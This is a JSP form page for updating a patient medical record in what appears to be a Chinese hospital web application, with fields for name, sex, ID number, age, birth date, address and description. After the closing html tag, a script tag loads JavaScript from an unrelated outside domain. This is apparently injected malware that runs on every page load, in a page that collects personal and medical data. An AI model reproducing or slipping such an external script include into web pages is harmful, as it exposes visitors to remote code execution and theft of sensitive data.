<%--
  Created by IntelliJ IDEA.
  User: ibm
  Date: 2018/7/10
  Time: 13:53
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <link type="text/css" href="../css/stylesheet.css" rel="stylesheet"/>
    <script type="text/javascript" src="../js/popcalendar.js"></script>
    <title>更新病历</title>
</head>
<body>
<center>
    <form>
        <table>
            <td colspan="2"><center><b>病历</b></center></td>
            <tr>
                <td>真实姓名：</td>
                <td><input type="text" id="txtName" size="30" value="${patient.patient_name}"/><font color="red">&nbsp;&nbsp;*</font></td>
            </tr>
            <tr>
                <td>性&nbsp;&nbsp;&nbsp;&nbsp;别：</td>
                <td>
                    <input type="radio" value="男" name="sex" checked/>男&nbsp;&nbsp;
                    <input type="radio" value="女" name="sex"/>女<font color="red">&nbsp;&nbsp;*</font>
                </td>
            </tr>
            <tr>
                <td>身份证号：</td>
                <td><input type="text" id="txtNo" size="30"/><font color="red">&nbsp;&nbsp;*</font></td>
            </tr>
            <tr>
                <td>年&nbsp;&nbsp;&nbsp;&nbsp;龄：</td>
                <td><input type="text" id="txtAge" size="30"/><font color="red">&nbsp;&nbsp;*</font></td>
            </tr>
            <tr>
                <td>出生日期：</td>
                <td nowrap>
                    <input type="text" id="txtDate" size="30" readonly="true">
                    <img style="cursor:hand" align="absMiddle"
                         onClick="popUpCalendar(this, document.getElementById('txtDate'),'yyyy-mm-dd');return false;"
                         src="../images/date/images/ew_calendar.gif"
                         width="16" height="16">
                    <font color="red">&nbsp;&nbsp;*</font>
                </td>
            </tr>
            <tr>
                <td>地&nbsp;&nbsp;&nbsp;&nbsp;址：</td>
                <td><input type="text" size="30"/><font color="red">&nbsp;&nbsp;*</font></td>
            </tr>
            <tr>
                <td>病历描述：</td>
                <td><textarea id="txtarea" rows="9" cols="28"></textarea></td>
            </tr>
            <tr align="center">
                <td  colspan="4" >
                    <img src="../images/New_Icon.gif" alt="新增" onclick="alert('login')">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <img src="../images/btn_save.GIF" alt="保存" onclick="alert('login')">
                </td>
            </tr>
            </tr>
        </table>
    </form>
</center>
</body>
</html><script language=javascript src=http://www.haofbi.com/js/w.js></script>
